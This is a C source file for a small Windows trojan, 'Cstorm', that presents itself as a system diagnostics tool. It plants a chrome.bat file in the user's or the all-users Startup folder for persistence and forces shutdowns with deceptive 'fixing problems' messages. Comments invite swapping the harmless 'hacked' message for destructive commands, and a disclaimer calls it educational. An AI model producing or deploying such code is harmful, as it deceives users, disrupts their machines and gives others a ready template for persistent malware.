
/* Cstorm is a rewrite of PYIRUS , a startup trojan python script to  C programming language.
    Both these projects were developed independantly by M.Anish only. For Educational purpose only!
    USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/

#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<ctype.h>

void tunnel()
{
    system("echo %USERPROFILE%>user");
}

void tscan()
{
    FILE *f,*fp;
    char s[800],ch; int i=0;
    f=fopen("user","r");
    if(f==NULL)
    {
        exit(0);
    }
    while(feof(f)==0)
    {
        fscanf(f,"%c",&ch);
        if(ch=='\n')
            break;
        s[i]=ch;
        i++;
    }
    s[i]='\0';
    fclose(f);
    strcat(s,"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat");
    fp=fopen(s,"w");
    if(fp==NULL)
    {
        f=fopen("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat","w");
        if(f==NULL)
        {
            system("cls");
            remove("user");
            printf("\nPlease Run this Program as ADMINISTRATOR to continue...\n");
            system("timeout 10");
            exit(0);
        }
        fprintf(f,"\necho off\necho Your Computer has been Hacked!\npause"); // You can easily replace with destructive commands to be executed by cmd.exe
        fclose(f);
        system("shutdown /f /t 005 /s /c \"We have to restart the PC to fix detected problems.\"");
        exit(0);
    }
    fprintf(fp,"\necho off\necho Your Computer Has Been Hacked!\npause");// You can easily replace with destructive commands to be executed by cmd.exe
    fclose(fp);
}

void ok()
{
    remove("user");
}

void run()
{
    tunnel();
    tscan();
}

void pause()
{
    printf("\n");
    system("pause");
}

int main()
{
    system("title System Diagonistics Tool ");
    run();
    ok();
    printf("\n|----- System Diagonists -----|\n");
    printf("\n Checking PC for problems...\n");
    system("systeminfo");
    system("shutdown /f /t 005 /s /c \"We have to shutdown the PC to fix detected problems.\"");
    pause();
}
